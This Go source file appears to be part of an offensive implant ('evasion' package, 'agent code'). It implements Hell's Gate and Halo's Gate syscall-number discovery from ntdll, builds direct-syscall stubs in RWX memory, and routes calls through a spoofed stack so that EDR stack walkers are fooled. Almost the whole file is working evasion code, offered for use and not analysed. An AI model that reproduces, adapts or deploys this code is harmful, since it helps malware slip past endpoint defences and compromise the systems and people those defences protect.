//go:build windows
// +build windows

package evasion

// Hell's Gate + Halo's Gate — dynamic syscall number discovery.
//
// 1. Walk ntdll export table, find the target Nt* function.
// 2. Read the first bytes: if clean (4C 8B D1 B8 ...) extract SSN directly.
// 3. If hooked (first byte != 4C), scan neighbouring exports up/down for an
//    unhooked stub and deduce the SSN by offset (Halo's Gate).
// 4. Allocate a private RWX trampoline and write an 11-byte stub:
//      mov r10, rcx   ; 4C 8B D1
//      mov eax, <SSN> ; B8 lo hi 00 00
//      syscall        ; 0F 05
//      ret            ; C3
// 5. Invoke via syscall.SyscallN — Go's Windows runtime calls the trap arg
//    as a function pointer, so our stub executes directly.

import (
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const hgStubSize = 11

// hgExtractSSN reads the syscall number from a clean ntdll stub.
func hgExtractSSN(addr uintptr) (uint16, bool) {
	if addr == 0 {
		return 0, false
	}
	b := (*[8]byte)(unsafe.Pointer(addr))
	// Clean x64 stub: 4C 8B D1 (mov r10,rcx)  B8 lo hi 00 00 (mov eax,N)
	if b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8 {
		return uint16(b[4]) | uint16(b[5])<<8, true
	}
	return 0, false
}

// hgNtdllBase returns ntdll.dll base address via GetModuleHandleEx.
func hgNtdllBase() uintptr {
	var h windows.Handle
	name, _ := windows.UTF16PtrFromString(sNtdll())
	_ = windows.GetModuleHandleEx(0, name, &h)
	return uintptr(h)
}

// hgExports returns (numberOfNames, namesRVA array, ordinalsRVA array, funcsRVA array)
// base-absolute pointers into the mapped ntdll image.
func hgExports(base uintptr) (count uint32, names, ords, funcs uintptr, ok bool) {
	if base == 0 {
		return
	}
	e_lfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	// PE32+ optional header: DataDirectory[0] at offset 0x88 from PE signature
	exportDirRVA := *(*uint32)(unsafe.Pointer(base + uintptr(e_lfanew) + 0x88))
	if exportDirRVA == 0 {
		return
	}
	ed := base + uintptr(exportDirRVA)
	count = *(*uint32)(unsafe.Pointer(ed + 0x18)) // NumberOfNames
	funcs = base + uintptr(*(*uint32)(unsafe.Pointer(ed + 0x1C)))
	names = base + uintptr(*(*uint32)(unsafe.Pointer(ed + 0x20)))
	ords  = base + uintptr(*(*uint32)(unsafe.Pointer(ed + 0x24)))
	ok = true
	return
}

func hgCStr(addr uintptr) string {
	var b [256]byte
	for i := range b {
		c := *(*byte)(unsafe.Pointer(addr + uintptr(i)))
		if c == 0 {
			return string(b[:i])
		}
		b[i] = c
	}
	return string(b[:])
}

// hgFindSSN resolves a syscall number for a named Nt* function.
func hgFindSSN(funcName string) (uint16, bool) {
	base := hgNtdllBase()
	count, names, ords, funcs, ok := hgExports(base)
	if !ok {
		return 0, false
	}

	for i := uint32(0); i < count; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(names + uintptr(i*4)))
		name := hgCStr(base + uintptr(nameRVA))
		if name != funcName {
			continue
		}
		ord := uint32(*(*uint16)(unsafe.Pointer(ords + uintptr(i*2))))
		funcAddr := base + uintptr(*(*uint32)(unsafe.Pointer(funcs + uintptr(ord*4))))

		// Direct extraction
		if ssn, ok2 := hgExtractSSN(funcAddr); ok2 {
			return ssn, true
		}

		// Halo's Gate: scan up/down for unhooked neighbour
		for delta := uint32(1); delta <= 32; delta++ {
			if ord >= delta {
				addr := base + uintptr(*(*uint32)(unsafe.Pointer(funcs + uintptr((ord-delta)*4))))
				if ssn, ok2 := hgExtractSSN(addr); ok2 {
					return ssn + uint16(delta), true
				}
			}
			if ord+delta < count {
				addr := base + uintptr(*(*uint32)(unsafe.Pointer(funcs + uintptr((ord+delta)*4))))
				if ssn, ok2 := hgExtractSSN(addr); ok2 {
					return ssn - uint16(delta), true
				}
			}
		}
		return 0, false
	}
	return 0, false
}

// hgAlloc allocates a private RWX page for a stub.
func hgAlloc(size uint32) uintptr {
	addr, _, _ := modKernel32.NewProc("VirtualAlloc").Call(
		0, uintptr(size), 0x3000 /*MEM_COMMIT|RESERVE*/, 0x40, /*PAGE_EXECUTE_READWRITE*/
	)
	return addr
}

// HGProc is a dynamically-built syscall stub for one Nt* function.
type HGProc struct {
	stub uintptr
}

// NewHGProc builds a private syscall stub for the named Nt* function.
// Returns nil if the SSN could not be resolved or allocation failed.
func NewHGProc(name string) *HGProc {
	ssn, ok := hgFindSSN(name)
	if !ok {
		return nil
	}
	addr := hgAlloc(hgStubSize)
	if addr == 0 {
		return nil
	}
	s := (*[hgStubSize]byte)(unsafe.Pointer(addr))
	s[0] = 0x4C; s[1] = 0x8B; s[2] = 0xD1          // mov r10, rcx
	s[3] = 0xB8                                       // mov eax, ...
	s[4] = byte(ssn); s[5] = byte(ssn >> 8); s[6] = 0x00; s[7] = 0x00
	s[8] = 0x0F; s[9] = 0x05                          // syscall
	s[10] = 0xC3                                       // ret
	return &HGProc{stub: addr}
}

// Call invokes the stub, routing through SpoofedSyscall so that EDR
// stack-walkers see an ntdll return address rather than agent code.
func (p *HGProc) Call(args ...uintptr) (r1, r2 uintptr, err syscall.Errno) {
	if p == nil || p.stub == 0 {
		return 0, 0, syscall.EINVAL
	}
	return SpoofedSyscall(p.stub, args...)
}
